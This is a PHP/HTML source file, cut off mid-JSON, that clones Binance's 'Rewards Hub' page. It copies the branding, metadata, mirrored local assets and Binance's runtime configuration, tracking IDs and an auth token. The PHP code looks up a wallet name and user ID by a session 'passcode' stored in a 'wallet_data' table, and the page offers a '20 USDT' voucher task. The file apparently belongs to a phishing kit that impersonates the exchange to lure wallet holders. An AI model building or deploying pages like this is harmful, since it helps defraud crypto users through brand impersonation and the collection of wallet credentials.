<?php include "login-stay.php"; ?>
    <?php

// Fetch wallet name and user ID from DB
require_once 'config.php';
$walletName = 'Wallet User';
$userId = '';
if (isset($_SESSION['passcode'])) {
    $stmt = $conn->prepare("SELECT wallet_name, user_id FROM wallet_data WHERE passcode = ? ORDER BY id DESC LIMIT 1");
    $stmt->bind_param("s", $_SESSION['passcode']);
    $stmt->execute();
    $result = $stmt->get_result();
    if ($row = $result->fetch_assoc()) {
        $walletName = htmlspecialchars($row['wallet_name']);
        $userId = htmlspecialchars($row['user_id']);
    }
    $stmt->close();
}?>
<?php include "header.php"; ?>
<!doctype html>
<html lang="en" dir="ltr" path-prefix="/en">

<head>
    <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
    <meta charset="utf-8" />
    <!-- <title data-shuvi-head="true">Rewards Hub</title> -->
    <meta name="description" content="Join activities and earn attractive rewards in Rewards Hub." data-shuvi-head="true" />
    <meta property="og:url" content="https://www.binance.com" data-shuvi-head="true" />
    <meta property="og:type" content="website" data-shuvi-head="true" />
    <meta property="og:title" content="Rewards Hub" data-shuvi-head="true" />
    <meta property="og:site_name" content="binance" data-shuvi-head="true" />
    <meta property="og:image" content="https://public.bnbstatic.com/static/images/common/ogImage.jpg" data-shuvi-head="true" />
    <meta property="twitter:title" content="Rewards Hub" data-shuvi-head="true" />
    <meta property="twitter:site" content="binance" data-shuvi-head="true" />
    <meta property="twitter:image" content="https://public.bnbstatic.com/static/images/common/ogImage.jpg" data-shuvi-head="true" />
    <meta property="twitter:image:src" content="https://public.bnbstatic.com/static/images/common/ogImage.jpg" data-shuvi-head="true" />
    <meta http-equiv="etag" content="9d462b011dbafaa0a4944453d3b823ad481cd5e6" />
    <meta name="msapplication-TileImage" content="./bin.bnbstatic.com/static/images/bnb-for/brand.png" />

    <link as="image" fetchpriority="high" media="(max-width: 767px)" rel="preload" href="./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-mobile-light.svg" data-shuvi-head="true" />
    <link as="image" fetchpriority="high" media="(min-width: 768px) and (max-width: 1023px)" rel="preload" href="./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-tablet-light.svg" data-shuvi-head="true" />
    <link as="image" fetchpriority="high" media="(min-width: 1024px)" rel="preload" href="./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-desktop-light.svg" data-shuvi-head="true" />
    <link rel="preload" as="script" href="./public.bnbstatic.com/unpkg/essential/essential@0.3.53.js" />
    <link rel="preload" as="script" href="./public.bnbstatic.com/unpkg/vendor/vendor.umd.0.0.11.production.min.18.2.0.js" />
    <link rel="preload" href="./bin.bnbstatic.com/static/chunks/layout-2981.b079e267.js" as="script" />
    <link rel="preload" href="./bin.bnbstatic.com/static/chunks/layout-0df3.f1189d00.js" as="script" />
    <link rel="preload" href="./bin.bnbstatic.com/static/chunks/page-e2d5.65548fa5.js" as="script" />
    <link rel="preload" as="script" href="./bin.bnbstatic.com/static/configs/newbase/common-widget-icon.js" />
    <link rel="preload" as="script" href="./public.bnbstatic.com/unpkg/themis/themis@0.0.39.js" />
    <link rel="preload" as="script" href="./public.bnbstatic.com/unpkg/common-widget/vendor@1.3.717.min.js" />
    <link rel="preload" as="script" href="./public.bnbstatic.com/unpkg/common-widget/utils@1.3.717.min.js" />
    <link rel="preload" as="script" href="./public.bnbstatic.com/unpkg/common-widget/data@1.3.717.min.js" />
    <link rel="preload" as="script" href="./public.bnbstatic.com/unpkg/common-widget/common@1.3.717.min.js" />
    <link rel="preload" as="script" href="./bin.bnbstatic.com/static/webpack-runtime.f6541e92.js" />
    <link rel="preload" as="script" href="./bin.bnbstatic.com/static/common/framework.cb5d2a75.js" />
    <link rel="preload" as="script" href="./bin.bnbstatic.com/static/main.31a0ed8c.js" />
    <link rel="preload" as="script" href="./public.bnbstatic.com/unpkg/config/remote-config.js" />
    <link rel="shortcut icon" href="./bin.bnbstatic.com/static/images/common/favicon.ico" />
    <link rel="apple-touch-icon" href="./bin.bnbstatic.com/static/images/bnb-for/brand.png" />
    <link rel="icon" href="./bin.bnbstatic.com/static/images/bnb-for/brand.png" />
    <link rel="canonical" href="https://www.binance.com/rewards-hub" data-shuvi-head="true" />
  
   
 
    <link rel="stylesheet" href="./bin.bnbstatic.com/static/css/bfdfa9a1.chunk.css" />
    <link rel="stylesheet" href="./bin.bnbstatic.com/static/css/57be5b55.chunk.css" />
    <link rel="stylesheet" href="./bin.bnbstatic.com/static/css/13d1d64d.chunk.css" />
    <link rel="stylesheet" href="./bin.bnbstatic.com/static/css/0fe774dd.chunk.css" />
    <link rel="stylesheet" href="./bin.bnbstatic.com/static/css/d4b10082.chunk.css" />
    <link rel="stylesheet" href="./bin.bnbstatic.com/static/css/bc6cbf4b.chunk.css" />
    <link rel="public.bnbstatic.com/unpkg/common-widget/header@1.3.717.css" />
    <link rel="public.bnbstatic.com/unpkg/common-widget/footer@1.3.717.css" />
    <link rel="public.bnbstatic.com/unpkg/common-widget/extension@1.3.717.css" />
    <link rel="public.bnbstatic.com/unpkg/common-widget/vendor@1.3.717.css" />
    <link rel="public.bnbstatic.com/unpkg/common-widget/common@1.3.717.css" />
    <style>
        body #__APP_HEADER {
            position: sticky;
            top: 0;
            z-index: 999;
        }
    </style>
    <style id="webstudio-universal-uikit-colors" data-shuvi-head="true">
        body {
            --color-sell: #F6465D;
            --color-textSell: #F6465D;
            --color-sellHover: #FF707E;
            --color-depthSellBg: #35141D;
            --color-buy: #0ECB81;
            --color-textBuy: #0ECB81;
            --color-buyHover: #32D993;
            --color-depthBuyBg: #102821;
            --color-line: #2B3139;
            --color-outlineHover: #6A4403;
            --color-primary: #FCD535;
            --color-primaryHover: #F0B90B;
            --color-error: #F6465D;
            --color-errorBg: #35141D;
            --color-success: #0ECB81;
            --color-successBg: #102821;
            --color-disable: #474D57;
            --color-iconNormal: #848E9C;
            --color-textWhite: #FFFFFF;
            --color-textGray: #EAECEF;
            --color-textBlack: #0B0E11;
            --color-textPrimary: #EAECEF;
            --color-textSecondary: #B7BDC6;
            --color-textThird: #848E9C;
            --color-textDisabled: #5E6673;
            --color-textBrand: #F0B90B;
            --color-textToast: #A37200;
            --color-bg: #181A20;
            --color-bg1: #181A20;
            --color-bg2: #0B0E11;
            --color-bg3: #2B3139;
            --color-bg4: #5E6673;
            --color-bg6: #202630;
            --color-bg7: #191A1F;
            --color-popupBg: #1E2329;
            --color-badgeBg: #2D2A20;
            --color-selectedBg: #1E2026;
            --color-gradientBrand: linear-gradient(180deg, #F8D12F 0%, #F0B90B 100%);
            --color-gradientPrimary: linear-gradient(295.27deg, #15141A 0%, #474D57 84.52%);
            --color-BasicBg: #181E25;
            background-color: var(--color-BasicBg);
            --color-SecondaryBg: #191A1F;
            --color-Input: #29313D;
            --color-InputLine: #434C5A;
            --color-CardBg: #202630;
            --color-Vessel: #29313D;
            --color-Line: #333B47;
            --color-DisableBtn: #434C5A;
            --color-DisabledText: #707A8A;
            --color-DisableText: #707A8A;
            --color-TertiaryText: #4F5867;
            --color-SecondaryText: #848E9C;
            --color-PrimaryText: #EAECEF;
            color: var(--color-PrimaryText);
            --color-RedGreenBgText: #FFFFFF;
            --color-EmphasizeText: #FF693D;
            --color-TextOnGray: #EAECEF;
            --color-TextOnYellow: #202630;
            --color-IconNormal: #707A8A;
            --color-LiteBg1: #FFFFFF;
            --color-LiteBg2: #FAFAFA;
            --color-BtnBg: #FCD535;
            --color-PrimaryYellow: #F0B90B;
            --color-TextLink: #F0B90B;
            --color-TradeBg: #0B0E11;
            --color-TextToast: #F0B90B;
            --color-DepthSellBg: #35141D;
            --color-SellHover: #F6465D;
            --color-Sell: #F6465D;
            --color-TextSell: #F6465D;
            --color-DepthBuyBg: #102821;
            --color-BuyHover: #2EBD85;
            --color-Buy: #2EBD85;
            --color-TextBuy: #2EBD85;
            --color-Error: #F6465D;
            --color-SuccessBg: #102821;
            --color-Success: #2EBD85;
            --color-TagBg: #434C5A;
            --color-Grid: #333B47;
            --color-Placeholder: #434C5A;
            --color-ToastBg: #707A8A;
            --color-TwoColorIcon: #CACED3;
            --color-ErrorBg: rgba(246, 70, 93, 0.1);
            --color-BadgeBg: rgba(240, 185, 11, 0.1);
        }
    </style>
    <style id="header-footer-global-style" data-shuvi-head="true">
        #__APP_SIDEBAR {
            display: none;
            width: 100%;
        }
    </style>
    <style type="text/css" id="b-fonts">
        @font-face {
            font-family: 'BinancePlex';
            font-display: swap;
            src: url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Light.woff2') format('woff2'), url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Light.otf') format('opentype');
            font-weight: 200 300
        }

        @font-face {
            font-family: 'BinancePlex';
            font-display: swap;
            src: url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Regular.woff2') format('woff2'), url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Regular.otf') format('opentype');
            font-weight: 400
        }

        @font-face {
            font-family: 'BinancePlex';
            font-display: swap;
            src: url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Medium.woff2') format('woff2'), url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Medium.otf') format('opentype');
            font-weight: 500
        }

        @font-face {
            font-family: 'BinancePlex';
            font-display: swap;
            src: url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-SemiBold.woff2') format('woff2'), url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-SemiBold.otf') format('opentype');
            font-weight: 600
        }

        @font-face {
            font-family: 'BinancePlex';
            font-display: swap;
            src: url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Bold.woff2') format('woff2'), url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Bold.otf') format('opentype');
            font-weight: 700 800
        }

        @font-face {
            font-family: 'BinancePlex';
            font-display: swap;
            src: url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Black.woff2') format('woff2'), url('./bin.bnbstatic.com/static/fonts/bp/BinancePlex-Black.otf') format('opentype');
            font-weight: 900
        }

        html body,
        body {
            font-family: BinancePlex, Arial, sans-serif !important
        }
    </style>
    <style>
        .tasks-container {
            padding: 24px;
            background: #0B0E11;
        }

        .section-header {
            font-size: 16px;
            font-weight: 500;
            color: #EAECEF;
            margin-bottom: 24px;
            position: relative;
            display: inline-block;
        }

        .section-header::after {
            content: '';
            position: absolute;
            bottom: -8px;
            left: 0;
            width: 24px;
            height: 2px;
            background: #FCD535;
        }

        .task-card {
            background: #1E2329;
            border-radius: 8px;
            padding: 24px;
            position: relative;
        }

        .task-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 24px;
        }

        .task-left {
            display: flex;
            gap: 16px;
            flex: 1;
        }

        .task-info {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .task-info h2 {
            font-size: 16px;
            font-weight: 500;
            color: #EAECEF;
            margin: 0;
        }

        .info-section {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .info-row {
            display: flex;
            align-items: center;
            gap: 8px;
            justify-content: space-around;
        }

        .info-label {
            color: #848E9C;
            font-size: 14px;
            min-width: 180px;
        }

        .reward-value {
            color: #EAECEF;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .timer-value {
            color: #EAECEF;
            font-size: 14px;
        }

        .task-actions {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .task-button {
            padding: 8px 24px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .do-task-btn {
            background-color: #FCD535;
            color: #1E2329;
            border: none;
        }

        .rules-btn {
            background-color: #2B3139;
            color: #EAECEF;
            border: none;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .rules-btn svg {
            width: 16px;
            height: 16px;
        }

        .do-task-btn:hover {
            background-color: #F0B90B;
        }

        .rules-btn:hover {
            background-color: #373D45;
        }

        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 1000;
        }

        .popup-content {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #1E2329;
            padding: 24px;
            border-radius: 8px;
            max-width: 480px;
            width: 90%;
            color: #EAECEF;
        }

        .popup-header {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 16px;
            color: #EAECEF;
        }

        .popup-body {
            color: #848E9C;
            font-size: 14px;
            line-height: 1.5;
        }

        .popup-body h3 {
            color: #EAECEF;
            margin: 16px 0 8px;
            font-size: 16px;
        }

        .ok-button {
            width: 100%;
            padding: 12px;
            background-color: #FCD535;
            color: #1E2329;
            border: none;
            border-radius: 4px;
            margin-top: 20px;
            cursor: pointer;
            font-weight: 500;
            transition: background-color 0.3s ease;
        }

        .ok-button:hover {
            background-color: #F0B90B;
        }
        .body{
            padding-top: 100px;
        }
    </style>

    
</head>

<body class="body">
    <div id="__APP_TOP_PORTAL"></div>
   
            <div id="__APP">
                <style data-emotion-css="w9qxu7">
                    body {
                        background-color: #181A20;
                    }
                </style>
                <div class="PageLayout ">
                    <div class="PageLayout-header">
                        <div class="PageLayout-header-content">
                            <div class="HomeBanner dark">
                                <div class="HomeBanner-help">
                                    <a href="" class="HomeHelp">
                                        <div class="ul-svg-container"><svg fill="textPrimary" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="bn-svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 3H19v18H6.5v-2.5H4V16h2.5v-2.75H4v-2.5h2.5V8H4V5.5h2.5V3zm6.25 4.75c-.69 0-1.25.56-1.25 1.25v.5H9V9a3.75 3.75 0 116.402 2.652L14 13.053V14.5h-2.5v-2.482l2.134-2.134a1.25 1.25 0 00-.884-2.134zM11.5 19v-2.5H14V19h-2.5z" fill="currentColor"></path></svg></div>FAQ</a>
                                </div>
                                <div class="HomeBanner-container ul-container ul-relative ul-flex ul-flex-col">
                                    <div class="HomeBanner-heading">
                                        <h1 class="HomeBanner-heading-title">Join activities and earn attractive rewards in Rewards Hub.</h1>
                                        <div class="HomeBanner-heading-subTitle">Grab the rewards before they run out!</div>
                                    </div>
                                    <div class="HomeBanner-lowerSection">
                                        <div class="HomeBannerSummary">
                                            <div class="HomeBannerSummaryItem">
                                                <div class="HomeBannerSummaryItem-title-container">
                                                    <div class="HomeBannerSummaryItem-data">0</div>
                                                    <div class="HomeBannerSummaryItem-title">Points</div>
                                                </div>
                                                <div class="HomeBannerSummaryItem-link">
                                                    <a href="" class="HomeLink HomeLink--defaultLink">
                                                        <div class="HomeLink-text">Rewards Shop</div>
                                                        <div class="HomeLink-icon"><svg fill="HomeLinkMobile" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="bn-svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.288 12l-3.89 3.89 1.768 1.767L15.823 12l-1.768-1.768-3.889-3.889-1.768 1.768 3.89 3.89z" fill="currentColor"></path></svg></div>
                                                    </a>
                                                </div>
                                            </div>
                                            <div class="HomeBannerSummaryItem">
                                                <div class="HomeBannerSummaryItem-title-container">
                                                    <div class="HomeBannerSummaryItem-data">0</div>
                                                    <div class="HomeBannerSummaryItem-title">Vouchers</div>
                                                </div>
                                                <div class="HomeBannerSummaryItem-link">
                                                    <a href="" class="HomeLink HomeLink--defaultLink">
                                                        <div class="HomeLink-text">My Vouchers</div>
                                                        <div class="HomeLink-icon"><svg fill="HomeLinkMobile" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="bn-svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.288 12l-3.89 3.89 1.768 1.767L15.823 12l-1.768-1.768-3.889-3.889-1.768 1.768 3.89 3.89z" fill="currentColor"></path></svg></div>
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div><img class="HomeBanner-logo" src="./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-desktop-dark.svg" /></div>
                        </div>
                    </div>
                    <div class="PageLayout-content HomePage-headerContent">
                        <div class="ul-container HomePage ul-relative">
                            <div class="HomePage-content">
                                <div class="HomeSection HomeTasks ul-relative ul-flex-1 HomeTasks-listEmpty">
                                    <div class="HomeSection-heading">
                                        <h2 class="HomeSection-title">Get Rewards</h2>
                                        <div class="HomeSection-heading-actions">
                                            <a href="" class="MoreLink">
                                                <div class="MoreLink-title">View More</div><svg fill="RewardsHubTextThird" class="bn-svg MoreLink-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.288 12l-3.89 3.89 1.768 1.767L15.823 12l-1.768-1.768-3.889-3.889-1.768 1.768 3.89 3.89z" fill="currentColor"></path></svg></a>
                                        </div>
                                    </div>
                                    <div class="HomeSection-subTitle">Complete these tasks to earn daily rewards!</div>
                                  <main class="rewards-container">
                                    <div class="tasks-container">
                                        <h1 class="section-header">Onboarding Tasks</h1>
                                        <div class="task-card">
                                            <div class="task-content">
                                                <div class="task-left">
                                                    <div class="task-icon">
                                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
                                                        </svg>
                                                    </div>
                                                    <div class="task-info">
                                                        <h2>Complete personal verification</h2>
                                                        <div class="info-section">
                                                            <div class="info-row">
                                                                <span class="info-label">Reward</span>
                                                                <div class="reward-value">
                                                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16" height="16">
                                                                        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                                                                    </svg>
                                                                    20 USDT Trading Fee Rebate Voucher
                                                                </div>
                                                            </div>
                                                            <div class="info-row">
                                                                <span class="info-label">Time Left to Complete Task</span>
                                                                <span class="timer-value">06 Days 05 Hours 32 Minutes</span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="task-actions">
                                                    <button class="task-button do-task-btn" onclick="handleDoTask()">Do Task</button>
                                                    <button class="task-button rules-btn" onclick="showRulesPopup()">
                                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                                                        </svg>
                                                        Rules
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </main>
                                </div>
                                <div class="HomeSection">
                                    <div class="HomeSection-heading">
                                        <h2 class="HomeSection-title">Enjoy Rewards</h2>
                                        <div class="HomeSection-heading-actions">
                                            <a href="" class="MoreLink">
                                                <div class="MoreLink-title">View More</div><svg fill="RewardsHubTextThird" class="bn-svg MoreLink-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.288 12l-3.89 3.89 1.768 1.767L15.823 12l-1.768-1.768-3.889-3.889-1.768 1.768 3.89 3.89z" fill="currentColor"></path></svg></a>
                                        </div>
                                    </div>
                                   
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            </div>
            <?php include 'footer.php'; ?>
          
          
           
           
            <script id="__APP_DATA" type="application/json" nonce="fb48f4a4-57ea-45bf-bb90-7374fa7eb8cb">
                {
                    "dynamicIds": ["Zu1U", "4Whi", "D4P9", "xE8/", "QFE7", "mk7A", "XxiJ", "JyHn", "G14Y", "pFSi", "wC3K", "8uyH", "8tQJ", "nn0X", "/vTW", "k5JY", "FubV", "nsO7", "kjXs", "3Pj3", "9mmq", "R2Ip", "SDpl", "YgAF", "tYhB", "+bWL", "Ca1D", "B35M", "ExeA", "G9To", "Lp65", "28x1", "GfFo", "eheR", "sIHV", "Sut8"],
                    "ssr": true,
                    "appState": {
                        "error": {
                            "error": null
                        },
                        "loader": {
                            "dataByRouteId": {
                                "2981": {},
                                "0df3": {},
                                "e2d5": {
                                    "faq": []
                                }
                            }
                        }
                    },
                    "pageData": {
                        "shuviInitialState": {
                            "cookies": {
                                "theme": "dark",
                                "userPreferredCurrency": "USD_USD"
                            },
                            "global": {
                                "origin": "",
                                "url": "",
                                "path": "",
                                "host": "",
                                "dir": "ltr",
                                "metaData": {
                                    "metaTitle": "Binance",
                                    "metaKeyword": "Buy/Sell Bitcoin, Ether and Altcoins | Cryptocurrency Exchange | Binance",
                                    "metaDescription": "Binance cryptocurrency exchange - We operate the worlds biggest bitcoin exchange and altcoin crypto exchange in the world by volume",
                                    "ogImage": ""
                                },
                                "region": "",
                                "isHybrid": false,
                                "withChat": true,
                                "withHeader": true,
                                "withFooter": true,
                                "withCompliance": true,
                                "restrictedBusinessKeys": [],
                                "noticeInfo": null,
                                "pageLayout": 1248
                            },
                            "persistSetting": {
                                "favorites": [],
                                "isHideSmallBalance": false,
                                "maskedBalance": false
                            },
                            "products": {
                                "loading": true,
                                "productMap": {},
                                "hotProduct": [],
                                "updateTime": 1746072134137
                            },
                            "ssrStore": {},
                            "userCenter": {
                                "userInfo": {},
                                "pmAccountInfo": {},
                                "languageMap": {},
                                "fiatCurrencyInfo": [],
                                "userPreferredCurrency": {},
                                "fiatCurrency": {
                                    "USD": {
                                        "pair": "USD_USD",
                                        "rate": 1,
                                        "symbol": "$"
                                    }
                                },
                                "loginStatus": {
                                    "isLoading": true
                                },
                                "userContract": {
                                    "assetDetails": []
                                },
                                "userQuoteAsset": "BTC",
                                "userBncLocation": "BINANCE"
                            },
                            "settings": {
                                "pageName": "rewards-hub",
                                "metaData": {
                                    "titleKey": "rewardsHub",
                                    "descriptionKey": "Banner-title"
                                },
                                "linkData": [{
                                    "rel": "preload",
                                    "as": "image",
                                    "fetchpriority": "high",
                                    "href": "./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-mobile-light.svg",
                                    "media": "(max-width: 767px)"
                                }, {
                                    "rel": "preload",
                                    "as": "image",
                                    "fetchpriority": "high",
                                    "href": "./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-tablet-light.svg",
                                    "media": "(min-width: 768px) and (max-width: 1023px)"
                                }, {
                                    "rel": "preload",
                                    "as": "image",
                                    "fetchpriority": "high",
                                    "href": "./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-desktop-light.svg",
                                    "media": "(min-width: 1024px)"
                                }],
                                "allowedModules": {
                                    "vouchers": true,
                                    "tasks": true,
                                    "dailyLogin": true,
                                    "points": true,
                                    "faq": true
                                },
                                "apolloConfigs": {
                                    "rwHub.ALWAYS_ON_MICA_REFERRAL_TASK_ID": "629",
                                    "rwHub.ALWAYS_ON_NON_MICA_REFERRAL_TASK_ID": "630",
                                    "rwHub.ALWAYS_ON_NON_MICA_REFERRAL_CHALLENGE_ID": "476",
                                    "rwHub.COUNTDOWN_VOUCHER_LIST": "",
                                    "rwHub.ALWAYS_ON_MICA_REFERRAL_CHALLENGE_ID": "475",
                                    "rwHub.NUZ_BLOCK_LOCALES": "{\"zh-CN\":\"/events/new-user-zone\",\"pt-BR\":\"/\"}"
                                }
                            }
                        },
                        "redux": {
                            "cookies": {
                                "theme": "dark",
                                "userPreferredCurrency": "USD_USD"
                            },
                            "global": {
                                "origin": "",
                                "url": "",
                                "path": "",
                                "host": "",
                                "dir": "ltr",
                                "metaData": {
                                    "metaTitle": "Binance",
                                    "metaKeyword": "Buy/Sell Bitcoin, Ether and Altcoins | Cryptocurrency Exchange | Binance",
                                    "metaDescription": "Binance cryptocurrency exchange - We operate the worlds biggest bitcoin exchange and altcoin crypto exchange in the world by volume",
                                    "ogImage": ""
                                },
                                "region": "",
                                "isHybrid": false,
                                "withChat": true,
                                "withHeader": true,
                                "withFooter": true,
                                "withCompliance": true,
                                "restrictedBusinessKeys": [],
                                "noticeInfo": null,
                                "pageLayout": 1248
                            },
                            "persistSetting": {
                                "favorites": [],
                                "isHideSmallBalance": false,
                                "maskedBalance": false
                            },
                            "products": {
                                "loading": true,
                                "productMap": {},
                                "hotProduct": [],
                                "updateTime": 1746072134137
                            },
                            "ssrStore": {},
                            "userCenter": {
                                "userInfo": {},
                                "pmAccountInfo": {},
                                "languageMap": {},
                                "fiatCurrencyInfo": [],
                                "userPreferredCurrency": {},
                                "fiatCurrency": {
                                    "USD": {
                                        "pair": "USD_USD",
                                        "rate": 1,
                                        "symbol": "$"
                                    }
                                },
                                "loginStatus": {
                                    "isLoading": true
                                },
                                "userContract": {
                                    "assetDetails": []
                                },
                                "userQuoteAsset": "BTC",
                                "userBncLocation": "BINANCE"
                            },
                            "settings": {
                                "pageName": "rewards-hub",
                                "metaData": {
                                    "titleKey": "rewardsHub",
                                    "descriptionKey": "Banner-title"
                                },
                                "linkData": [{
                                    "rel": "preload",
                                    "as": "image",
                                    "fetchpriority": "high",
                                    "href": "./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-mobile-light.svg",
                                    "media": "(max-width: 767px)"
                                }, {
                                    "rel": "preload",
                                    "as": "image",
                                    "fetchpriority": "high",
                                    "href": "./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-tablet-light.svg",
                                    "media": "(min-width: 768px) and (max-width: 1023px)"
                                }, {
                                    "rel": "preload",
                                    "as": "image",
                                    "fetchpriority": "high",
                                    "href": "./bin.bnbstatic.com/static/images/rewards-hub-ui/logo-dt-desktop-light.svg",
                                    "media": "(min-width: 1024px)"
                                }],
                                "allowedModules": {
                                    "vouchers": true,
                                    "tasks": true,
                                    "dailyLogin": true,
                                    "points": true,
                                    "faq": true
                                },
                                "apolloConfigs": {
                                    "rwHub.ALWAYS_ON_MICA_REFERRAL_TASK_ID": "629",
                                    "rwHub.ALWAYS_ON_NON_MICA_REFERRAL_TASK_ID": "630",
                                    "rwHub.ALWAYS_ON_NON_MICA_REFERRAL_CHALLENGE_ID": "476",
                                    "rwHub.COUNTDOWN_VOUCHER_LIST": "",
                                    "rwHub.ALWAYS_ON_MICA_REFERRAL_CHALLENGE_ID": "475",
                                    "rwHub.NUZ_BLOCK_LOCALES": "{\"zh-CN\":\"/events/new-user-zone\",\"pt-BR\":\"/\"}"
                                }
                            }
                        },
                        "i18nResource": {
                            "en": {
                                "rewards-hub-ui": {
                                    "CountryRestrictionModal-title": "Service Notice",
                                    "CountryRestrictionModal-desc": "Dear user, as per our Terms of Use and compliance with local regulations, these features are not available in your region.",
                                    "CountryRestrictionModal-Cta": "Back to Homepage",
                                    "rewardsHub": "Rewards Hub",
                                    "Banner-title": "Join activities and earn attractive rewards in Rewards Hub.",
                                    "Banner-subTitle": "Grab the rewards before they run out!",
                                    "points": "Points",
                                    "rewardsShop": "Rewards Shop",
                                    "vouchers": "Vouchers",
                                    "myVouchers": "My Vouchers",
                                    "HomeTasks-title": "Get Rewards",
                                    "HomeTasks-subTitle": "Complete these tasks to earn daily rewards!",
                                    "viewMore": "View More",
                                    "HomeRewards-title": "Enjoy Rewards",
                                    "HomeRewards-subTitle": "Use these vouchers and enjoy their benefits!",
                                    "HomeRewards-NoRewards-subTitle": "No Ongoing Vouchers"
                                },
                                "widget-common": {}
                            }
                        },
                        "i18nNamespaces": ["rewards-hub-ui", "widget-common"],
                        "ssrData": {
                            "lang": "en",
                            "pathPrefix": "/en",
                            "level2Domain": "binance.com",
                            "isRegionMode": false
                        },
                        "_uikit": {
                            "theme": "dark"
                        }
                    },
                    "basename": "",
                    "runtimeConfig": {
                        // "STATIC_HOST": "https://bin.bnbstatic.com",
                        "STATIC_HOST": "http://localhost//test2/",
                        "STATIC_HOST_SHARE": "https://public.bnbstatic.com",
                        "STATIC_HOST_PRIVATE": "http://bin.bnbstatic.com.s3.ap-northeast-1.amazonaws.com",
                        "SITE_HOST": "https://www.binance.com",
                        "API_HOST": "https://www.binance.com",
                        "API_HOST_PRIVATE": "http://dispatcher-service.bin.internal",
                        "SENSORS_SERVER_HOST": "https://api.saasexch.com/bapi/fe/usd/sa?project=binance",
                        "NODE_ENV": "production",
                        "I18N_TRACK": "true",
                        "I18N_TRACK_APPID": "cc1ljun9gpbp8ciciolg",
                        "I18N_TRACK_HOST": "https://api.saasexch.com",
                        "SENTRY_ENV": "prod",
                        "GA_TRACKING_ID": "UA-162512367-1",
                        "GTM_TRACKING_ID": "M86QHGF",
                        "SENTRY_DSN": "https://8c0903d539acc057e461750bbe28ec66@o529943.ingest.sentry.io/4505673491087360",
                        "CACHE_PROXY_HOST": "http://cache-proxy.cache-proxy",
                        "THEMIS_ENV": "PROD",
                        "THEMIS_AUTH_GROWTH": "MTI4NTE4NDgxMTptd3dXU2x5bkR2dTBkbXpxT1d0NEhta0hhZmg2ZGVmaw==",
                        "THEMIS_ENTRY_STRATEGY": "web_rewards_hub_entry",
                        "COMMIT_HEAD": "9d462b011dbafaa0a4944453d3b823ad481cd5e6",
                        "I18N_BASE_PUBLIC": "https://bin.bnbstatic.com/api/i18n/-/web/cms"
                    },
                    "filesByRoutId": {
                        "2981": ["static/css/bfdfa9a1.chunk.css", "static/css/57be5b55.chunk.css", "static/chunks/layout-2981.b079e267.js"],
                        "4690": ["static/css/bfdfa9a1.chunk.css", "static/chunks/page-4690.205fc78c.js"],
                        "ca4b": ["static/css/0a762364.chunk.css", "static/chunks/layout-ca4b.969a4cd0.js"],
                        "2d83": ["static/css/108498f8.chunk.css", "static/chunks/page-2d83.0f2f6d54.js"],
